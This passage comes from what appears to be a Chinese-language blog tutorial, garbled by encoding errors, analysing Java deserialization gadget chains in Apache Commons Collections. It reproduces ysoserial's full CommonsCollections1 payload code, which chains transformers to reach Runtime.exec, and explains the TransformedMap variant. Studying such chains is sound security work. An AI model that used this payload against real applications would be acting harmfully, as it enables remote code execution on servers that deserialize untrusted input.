&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">construct&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">InvocationHandler&lt;/span> &lt;span style="color:#111">handler&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InvocationHandler&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">construct&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Retention&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">outerMap&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>åŒæ—¶å› ä¸ºAnnotationInvocationHandleræ˜¯å†…éƒ¨ç±»ä¸èƒ½ç›´æŽ¥newï¼Œæˆ‘ä»¬ç”¨åå°„+setAccessible(true)çš„æ–¹å¼å®žä¾‹åŒ–ï¼›å¹¶ä¸”ç”±äºŽ&lt;code>Runtime.getRuntime&lt;/code>æ²¡æœ‰å®žçŽ°åºåˆ—åŒ–çš„æŽ¥å£ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨åå°„èŽ·å–å½“å‰ä¸Šä¸‹æ–‡çš„Runtimeå¯¹è±¡&lt;/p>
&lt;p>å¦å¤–ï¼Œä¸ºäº†æ»¡è¶³readObjectä¸­çš„&lt;code>var7!=null&lt;/code>çš„åˆ¤æ–­ï¼Œè¦æ»¡è¶³&lt;/p>
&lt;ul>
&lt;li>&lt;code>sun.reflect.annotation.AnnotationInvocationHandler&lt;/code>æž„é€ å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºAnnotationçš„å­ç±»ï¼Œä¸”å¿…é¡»è‡³å°‘å«æœ‰ä¸€ä¸ªæ–¹æ³•ï¼Œå‡è®¾æ–¹æ³•åä¸ºX&lt;/li>
&lt;li>è¢«&lt;code>TransformedMap.decorate&lt;/code>ä¿®é¥°çš„Mapä¸­å¿…æœ‰ä¸€ä¸ªé”®åä¸ºXçš„å…ƒç´ &lt;/li>
&lt;/ul>
&lt;p>8u71ä¹‹åŽçš„ç‰ˆæœ¬ä¿®æ”¹äº†&lt;code>AnnotationInvocationHandler&lt;/code>çš„readObjectå‡½æ•°ï¼Œä¸å†ä½¿ç”¨ååºåˆ—åŒ–å¾—åˆ°çš„Mapå¯¹è±¡ï¼Œè€Œæ˜¯æ–°å»ºäº†LinkedHashMapå¯¹è±¡ï¼ŒæŠŠåŽŸæ¥çš„key-valueæ·»åŠ è¿›åŽ»ï¼Œæ‰€ä»¥åŽç»­å¯¹Mapçš„æ“ä½œéƒ½æ˜¯åŸºäºŽè¿™ä¸ª&lt;code>LinkedHashMap&lt;/code>å¯¹è±¡ï¼Œä¸ä¼šå†è§¦å‘setæˆ–putäº†&lt;/p>
&lt;p>æœ€åŽæŠŠå¯¹è±¡ç”Ÿæˆåºåˆ—åŒ–æµ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ByteArrayOutputStream&lt;/span> &lt;span style="color:#111">barr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ObjectOutputStream&lt;/span> &lt;span style="color:#111">oos&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">writeObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="lazymap">LazyMap&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">ysoserial.payloads&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.InvocationHandler&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.HashMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Map&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.Transformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.ChainedTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.ConstantTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.InvokerTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.map.LazyMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">ysoserial.payloads.annotation.Authors&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">ysoserial.payloads.annotation.Dependencies&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">ysoserial.payloads.annotation.PayloadTest&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">ysoserial.payloads.util.Gadgets&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">ysoserial.payloads.util.JavaVersion&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">ysoserial.payloads.util.PayloadRunner&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">ysoserial.payloads.util.Reflections&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">/*
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> Gadget chain:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> ObjectInputStream.readObject()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> AnnotationInvocationHandler.readObject()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> Map(Proxy).entrySet()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> AnnotationInvocationHandler.invoke()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> LazyMap.get()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> ChainedTransformer.transform()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> ConstantTransformer.transform()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> InvokerTransformer.transform()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> Method.invoke()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> Class.getMethod()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> InvokerTransformer.transform()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> Method.invoke()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> Runtime.getRuntime()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> InvokerTransformer.transform()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> Method.invoke()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> Runtime.exec()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> Requires:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> commons-collections
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@SuppressWarnings&lt;/span>&lt;span style="color:#f92672">({&lt;/span>&lt;span style="color:#d88200">&amp;#34;rawtypes&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;unchecked&amp;#34;&lt;/span>&lt;span style="color:#f92672">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@PayloadTest&lt;/span> &lt;span style="color:#f92672">(&lt;/span> &lt;span style="color:#111">precondition&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;isApplicableJavaVersion&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@Dependencies&lt;/span>&lt;span style="color:#f92672">({&lt;/span>&lt;span style="color:#d88200">&amp;#34;commons-collections:commons-collections:3.1&amp;#34;&lt;/span>&lt;span style="color:#f92672">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@Authors&lt;/span>&lt;span style="color:#f92672">({&lt;/span> &lt;span style="color:#111">Authors&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">FROHOFF&lt;/span> &lt;span style="color:#f92672">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">CommonsCollections1&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">PayloadRunner&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">ObjectPayload&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">InvocationHandler&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">InvocationHandler&lt;/span> &lt;span style="color:#75af00">getObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">execArgs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#111">command&lt;/span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// inert chain for setup
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">Transformer&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ChainedTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// real chain for after setup
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">transformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Runtime&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getMethod&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[].&lt;/span>&lt;span style="color:#75af00">class&lt;/span> &lt;span style="color:#f92672">},&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;getRuntime&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">}),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;invoke&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[].&lt;/span>&lt;span style="color:#75af00">class&lt;/span> &lt;span style="color:#f92672">},&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">}),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span> &lt;span style="color:#f92672">},&lt;/span> &lt;span style="color:#111">execArgs&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">innerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">lazyMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">LazyMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">decorate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">innerMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">mapProxy&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Gadgets&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">createMemoitizedProxy&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">lazyMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">InvocationHandler&lt;/span> &lt;span style="color:#111">handler&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Gadgets&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">createMemoizedInvocationHandler&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">mapProxy&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Reflections&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;iTransformers&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformers&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// arm with actual transformer chain
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">PayloadRunner&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">CommonsCollections1&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#75af00">isApplicableJavaVersion&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">JavaVersion&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isAnnInvHUniversalMethodImpl&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ysoserialç”¨çš„æ˜¯ä¸ŽTransformedMapç±»ä¼¼çš„LazyMapï¼Œä¸¤è€…çš„åŒºåˆ«åœ¨äºŽTransformedMapæ˜¯åœ¨æ‰§è¡Œputæ“ä½œæ—¶å›žè°ƒtransformï¼Œè€ŒLazyMapæ˜¯åœ¨getæ–¹æ³•ä¸­æ‰§è¡Œçš„factory.transformï¼Œåœ¨getæ‰¾ä¸åˆ°å€¼æ‰ä¼šè°ƒç”¨factory.transformåŽ»èŽ·å–ä¸€ä¸ªå€¼ï¼ˆæ‰€è°“Lazy&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">containsKey&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">factory&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">transform&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
